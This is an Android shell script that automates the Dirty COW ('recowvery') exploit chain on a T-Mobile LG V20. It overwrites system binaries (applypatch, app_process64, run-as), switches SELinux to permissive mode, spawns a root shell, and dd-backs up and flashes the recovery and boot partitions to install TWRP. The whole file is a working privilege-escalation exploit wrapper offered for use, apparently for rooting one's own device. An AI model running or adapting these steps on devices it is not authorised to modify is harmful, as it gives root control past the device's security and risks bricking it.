#!/system/bin/sh
###################################################
# Recowvery Self-Installer - selinux disabler
###################################################
# Just a simple script to take the human factor out
# of running jcadduono's recowvery exploits.
# For the H918 (T-mobile LG V20) with firmware V10d

# -- Helpers --

format_logs() {
    sed -i 's/$/\r/' audit.log
    sed -i 's/$/\r/' recowvery.log
}

fail() {
    echo
    case $1 in
        hashcheck)
            echo "One or more files are corrupt. Please re-download the exploit and try again."
            echo "If you insist, you can run the script again with integrity checking disabled... but just don't."
            break 2>/dev/null
            ;;
        hashcheck2)
            echo "One or more of your backups are corrupt or missing their respective .img.sha1 counterparts."
            echo "If you insist, you can run the script again with integrity checking disabled... but just don't."
            break 2>/dev/null
            ;;
        permissions)
            echo "Could not obtain enough permissions to run the exploit!"
            break 2>/dev/null
            ;;
        exploit)
            echo "The exploit process did not succeed, please check the logs!"
            echo "Rebooting to revert exploits..."
            nohup sh -c 'sleep 3 ; reboot'
            break 2>/dev/null
            ;;
        noimg)
            echo "Could not locate /sdcard/recovery.img. Please upload one and run the script again in \"flash only\" mode"
            break 2>/dev/null
            ;;
        flash)
            echo "DO NOT REBOOT YOUR DEVICE WITHOUT FIRST DIAGNOSING THE CAUSE!"
            break 2>/dev/null
            ;;
        *)
            echo "Unknown error! Rebooting to revert exploits..."
            nohup sh -c 'sleep 3 ; reboot'
            ;;
    esac
    echo "\nSOMETHING WENT WRONG! EXITING."

    dmesg | grep permissive= >audit.log

    format_logs()
}

exploit() {
    payload=recowvery-$1
    printf "Exploiting /system/bin/$1...\t\t\t\t"
    echo "\ndirtycow /system/bin/$1 $payload:" >>recowvery.log
    # Exploit  Target         Payload
    ./dirtycow /system/bin/$1 $payload >>recowvery.log 2>&1 || ( echo "FAILED!" ; fail permissions ; exit 1 )
    if [ ! $(strings /system/bin/$1 | grep ^$payload$ 2>/dev/null ) ] ; then echo "FAILED!" ; fail exploit ; exit 1 ; fi
    echo "SUCCESS!"
}

# We live in this dir. If we can't cd to it, then we've been locked out
cd /data/local/tmp/recowvery/ || fail permissions

# -- Arg parser --

echo "\n[ $(date) ] $0 $@\n" >>recowvery.log

# A 4-arg combo is out of our league o:
if [ $4 ] ; then
    echo "Wat?"
    exit 1
fi

cmdline="$0 $@"

while true ; do
    case "$1" in
        --stage1) # ACTION: Excalate privs and patch selinux if --permissive
            stage=${stage:-1}
            shift
            ;;
        --stage2) # ACTION: Back up then flash recovery.img
            stage=2
            shift
            ;;
        --flash) # ACTION: Resume flashing an already-exploited device
            stage=1
            flash=true
            shift
            ;;
        --restore) # ACTION: Flash stock_bootloader.img and stock_recovery.img from /sdcard
            restore=true
            shift
            ;;
        # --dump) # ACTION: TODO: Dump an arbitrary partition from an already-exploited device
        #     dump=1
        #     shift
        #     ;;
        --nohash) # OPTION: Skip hash check
            nohash=true
            shift
            ;;
        --permissive) # OPTION: Patch selinux to Permissive
            permissive=true
            shift
            ;;
        --shell) # ACTION: Exploit and run a root shell
            shell=true
            shift
            ;;
        -*) # ERROR: Something's wrong with the given arguments
            echo "Bad args"
            exit 1
            ;;
        *) # ACTION: Exploit and temp-disable selinux
            stage=${stage:-0}
            break
            ;;
    esac
done

# -- Main --

case $stage in
    0)
        # TODO: Move these to another file and/or ask JC to start serving his downloads with etags
              dirtycow_hash=7d4f77c917a4cc75ac88357fdec9eeeac87cb726
         app_process64_hash=e90e441aa0e9e0c5382c2c60c322f8e83242c8ce
            applypatch_hash=ea8986f74cdd5677750a88925b22db592089b934
                 runas_hash=ad90db62b72ab9ebb5438229ee2c09ff671cefc0

        if [ ! $nohash ] ; then
            printf "Checking exploit file integrity...\t\t\t\t"
            if [ ! "x$(sha1sum -b dirtycow 2>recowvery.log)" == "x$dirtycow_hash" ] ; then echo "FAILED!" ; fail hashcheck ; exit 1 ; fi
            if [ ! "x$(sha1sum -b recowvery-app_process64 2>recowvery.log)" == "x$app_process64_hash" ] ; then echo "FAILED!" ; fail hashcheck ; exit 1 ; fi
            if [ ! "x$(sha1sum -b recowvery-applypatch 2>recowvery.log)" == "x$applypatch_hash" ] ; then echo "FAILED!" ; fail hashcheck ; exit 1 ; fi
            if [ ! "x$(sha1sum -b recowvery-run-as 2>recowvery.log)" == "x$runas_hash" ] ; then echo "FAILED!" ; fail hashcheck ; exit 1 ; fi
            echo "SUCCESS!"
        fi

        chmod u+x dirtycow || (fail permissions ; exit 1)
        if [ ! $(stat -c %a dirtycow | cut -b 1) == 7 ] ; then fail permissions ; exit 1 ; fi

        exploit applypatch
        exploit app_process64

        echo "Waiting for selinux pwn... (timeout after 3 minutes)"

        $(sleep 180 ; fail ; exit 1) &

        logcat -s recowvery --regex ^Permissive\ boot.*successfully!$ -m1 >>recowvery.log

        printf "\n- - - selinux is ours! Rebooting - - -\n\n"
        reboot recovery
        ;;
    1)
        if [ ! "x$(getenforce)" == "xPermissive" ] ; then fail permissions ; exit 1 ; fi

        exploit run-as

        # We can haz root. Do we patch selinux, just flash recovery, or simply spawn a shell?
        if [ $shell ] ; then
            echo "\n- - - Spawning a shell. Have fun and be safe! - - -\n\n"
            echo "(There is no prompt indicator - just have at it. Type \"exit\" to quit)"
            printf "# "
            run-as su | tee shell.log
        elif [ $permissive ] && [ ! $flash ] && [ ! $restore ] ; then
            echo "\n- - - Rebooting to persist selinux permissive mode - - -\n\n"
            run-as exec ./recowvery-applypatch boot >>recowvery.log
        else
            sh $cmdline --stage2
            exit $?
        fi
        ;;
    2)
        if [ ! "x$(getenforce)" == "xPermissive" ] ; then fail permissions ; exit 1 ; fi

        if [ ! -e /sdcard/stock_recovery.img ] && [ ! -e /sdcard/stock_boot.img ] ; then
            printf "Creating backup of recovery at /sdcard/stock_recovery.img...\t"
            echo "dd if=/dev/block/bootdevice/by-name/recovery bs=4096 2>>/data/local/tmp/recowvery/recowvery.log" \| tee /sdcard/stock_recovery.img \| sha1sum -b \>/sdcard/stock_recovery.img.sha1 | run-as su >>recowvery.log
            if [ ! "x$?" == "x0" ] ; then echo "FAILED!" ; fail backup ; exit 1 ; fi
            echo "SUCCESS!"

            printf "Creating backup of boot at /sdcard/stock_boot.img...\t\t"
            echo "dd if=/dev/block/bootdevice/by-name/boot bs=4096 2>>/data/local/tmp/recowvery/recowvery.log" \| tee /sdcard/stock_boot.img \| sha1sum -b \>/sdcard/stock_boot.img.sha1 | run-as su >>recowvery.log
            if [ ! "x$?" == "x0" ] ; then echo "FAILED!" ; fail backup ; exit 1 ; fi
            echo "SUCCESS!"

            printf "Flashing recovery for fun and for profit...\t\t\t"
            # TODO: If no /sdcard/recovery.img... offer to wait (or download one)
            if [ ! -e /sdcard/recovery.img ] && [ -e /sdcard/recovery.img.img ] ; then echo "mv /sdcard/recovery.img.img /sdcard/recovery.img" | run-as su ; fi
            if [ ! -e /sdcard/recovery.img ] ; then echo "FAILED!" ; fail noimg ; exit 1 ; fi
            echo "dd if=/sdcard/recovery.img of=/dev/block/bootdevice/by-name/recovery bs=4096 2>>/data/local/tmp/recowvery/recowvery.log" | run-as su
            if [ ! "x$?" == "x0" ] ; then echo "FAILED!" ; fail flash ; exit 1 ; fi
            echo "SUCCESS!"

            printf "\n================================================================================"
            printf "\n===                       Congrats, TWRP is installed!                       ==="
            printf "\n===    Please follow the rest of the root thread to ensure a smooth ride!    ==="
            printf "\n================================================================================\n\n"

            # TODO: Try to automate the TWRP bits
        else
            if [ $restore ] ; then
                if [ ! $nohash ] ; then
                    printf "Checking backup image integrity...\t\t\t\t"
                    if [ ! "x$(sha1sum -b /sdcard/stock_boot.img 2>recowvery.log)" == "x$(cat /sdcard/stock_boot.img.sha1 2>recowvery.log)" ] ; then echo "FAILED!" ; fail hashcheck2 ; exit 1 ; fi
                    if [ ! "x$(sha1sum -b /sdcard/stock_recovery.img 2>recowvery.log)" == "x$(cat /sdcard/stock_recovery.img.sha1 2>recowvery.log)" ] ; then echo "FAILED!" ; fail hashcheck2 ; exit 1 ; fi
                    echo "SUCCESS!"
                fi

                printf "Restoring stock boot from /sdcard/stock_boot.img...\t\t"
                echo "dd if=/sdcard/stock_boot.img of=/dev/block/bootdevice/by-name/boot bs=4096 2>>/data/local/tmp/recowvery/recowvery.log" | run-as su >>recowvery.log
                if [ ! "x$?" == "x0" ] ; then echo "FAILED!" ; fail flash ; exit 1 ; fi
                echo "SUCCESS!"

                printf "Restoring stock recovery from /sdcard/stock_recovery.img...\t"
                echo "dd if=/sdcard/stock_recovery.img of=/dev/block/bootdevice/by-name/recovery bs=4096 2>>/data/local/tmp/recowvery/recowvery.log" | run-as su >>recowvery.log
                if [ ! "x$?" == "x0" ] ; then echo "FAILED!" ; fail flash ; exit 1 ; fi
                echo "SUCCESS!"

                echo mv /sdcard/stock_boot.img /sdcard/stock_boot.img.bak | run-as su >>recowvery.log
                echo mv /sdcard/stock_recovery.img /sdcard/stock_recovery.img.bak | run-as su >>recowvery.log

                printf "\n================================================================================"
                printf "\n===            Boot and recovery should now be back to full stock            ==="
                printf "\n===                 Please reboot for changes to take effect                 ==="
                printf "\n================================================================================\n\n"
            else
                echo "WARNING: Found an existing stock_* files in /sdcard!"
                echo "Please rename, move, or otherwise get these files out of the way before proceeding."
                echo "Exiting without modifications... run the script in \"flash only\" mode to try again."
            fi
        fi

        # TODO: Accept custom file and partition names for flashing

        exit 1 # Error out to ensure we never run stage 2 twice in a row
        ;;
esac

format_logs()

# -- EOF --
